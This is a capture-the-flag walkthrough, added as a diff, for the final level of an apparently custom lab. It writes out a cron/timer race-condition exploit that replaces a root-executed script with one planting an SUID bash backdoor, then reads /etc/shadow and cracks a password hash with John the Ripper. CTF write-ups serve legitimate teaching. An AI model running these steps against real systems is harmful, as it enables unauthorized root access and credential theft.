@@ -1,0 +1,117 @@
+level20 - root
+
+Phase 1: Land and Recon (Initial Enumeration)
+The player spawns into a restricted shell as level20. Their first move is to figure out what makes this specific environment unique.
+
+Check Group Privileges:
+The player runs id and instantly spots an unusual supplementary group:
+
+Bash
+level20@mastermind:~$ id
+uid=1021(level20) gid=1021(level20) groups=1021(level20),1028(bt_backup)
+Player Thought: "Okay, I belong to bt_backup. Let’s find what assets this group owns."
+
+Locate the Infrastructure:
+They search the filesystem for anything tagged with bt-backup or bt_backup:
+
+Bash
+find / -group bt_backup -type d 2>/dev/null
+They discover /var/lib/bt-backup/. Inside, they find a goldmine of clues:
+
+metadata/ (containing configuration fragments)
+
+cache/generated/ (containing a script called run.sh)
+
+backup.log and validation.log
+
+Analyze System Timers:
+Recognizing that automated tasks are a classic privilege escalation vector, they look for active cronjobs or systemd timers:
+
+Bash
+systemctl list-timers --all
+They spot two highly unusual, hyper-frequent timers ticking away:
+
+bt-backup.timer (Triggers every minute at :00)
+
+bt-backup-execute.timer (Triggers every minute at :30)
+
+Phase 2: Analyzing the Trust Boundary Flaw
+The player reads the logs to understand what happens during those intervals.
+
+Bash
+cat /var/lib/bt-backup/backup.log
+Tue Jun 16 03:00:00 PM UTC 2026 [INFO] Validation engine initialized
+
+Tue Jun 16 03:00:01 PM UTC 2026 [INFO] Cache subsystem online
+
+Tue Jun 16 03:00:30 PM UTC 2026 [EXEC] Running generated legacy cache...
+
+The Logic Deduction:
+The player realizes that at :00, a validation engine checks the configuration and regenerates a clean cache script (run.sh). Then, exactly 30 seconds later at :30, a root-privileged service blindly executes that exact script.
+
+The Permission Flaw:
+The player inspects the permissions of the directory where the code gets executed:
+
+Bash
+ls -la /var/lib/bt-backup/cache/
+drwxrwxr-x 2 root bt_backup 4096 Jun 16 15:00 generated
+
+Player Discovery: "Wait. The folder is writable by the bt_backup group. Even though root recreates a safe run.sh at :00, I have permission to delete and replace files inside this folder. I have a 29-second window between the validation check and the root execution!"
+
+Phase 3: Writing the Exploit (The Race Condition)
+The player knows a manual cp command might miss the tight window or fail due to execution speed, so they write a quick automated race-condition script.
+
+Stage the Payload:
+They create a script in /tmp/payload.sh designed to copy the standard Bash binary into a permanent location on the main disk and give it SUID permissions:
+
+Bash
+cat << 'EOF' > /tmp/payload.sh
+#!/bin/bash
+cp /bin/bash /var/lib/bt-backup/cache/generated/rootbash
+chmod +s /var/lib/bt-backup/cache/generated/rootbash
+EOF
+Deploy the Interceptor Loop:
+They launch a loop that constantly checks for root's safe file to drop at :00, deletes it instantly, and swaps it for their exploit payload:
+
+Bash
+while true; do
+    if [ -f /var/lib/bt-backup/cache/generated/run.sh ]; then
+        rm -f /var/lib/bt-backup/cache/generated/run.sh
+        cp /tmp/payload.sh /var/lib/bt-backup/cache/generated/run.sh
+        chmod +x /var/lib/bt-backup/cache/generated/run.sh
+        echo "[+] Intercepted run.sh! Waiting for execution mark..."
+        sleep 40
+    fi
+    sleep 0.1
+done
+Phase 4: Popping Root & The LabAdmin Crack
+Catching the Shell:
+The player watches their script print [+] Intercepted run.sh!. They wait for the clock to cross the :30 mark, kill the loop, and verify their backdoor exists:
+
+Bash
+ls -la /var/lib/bt-backup/cache/generated/rootbash
+Seeing -rwsr-sr-x 1 root root, they execute it with preserved privileges:
+
+Bash
+/var/lib/bt-backup/cache/generated/rootbash -p
+The prompt changes: rootbash-5.2#. They are now Root.
+
+Reading the Final Twist:
+They open /root/root.txt:
+
+Bash
+cat /root/root.txt
+BT{R00T_1S_N0T_TH3_3ND}
+
+The final secret belongs to the labadmin. Recover the password.
+
+Cracking the Hash:
+They extract the labadmin SHA-512 hash from /etc/shadow:
+
+Bash
+grep labadmin /etc/shadow
+They take this hash over to their host machine (Kali), drop it into a file called hash.txt, and fire up John the Ripper against rockyou.txt:
+
+Bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Within seconds, the terminal prints the ultimate flag and answer to the entire BreachTrail CTF: maradona10.
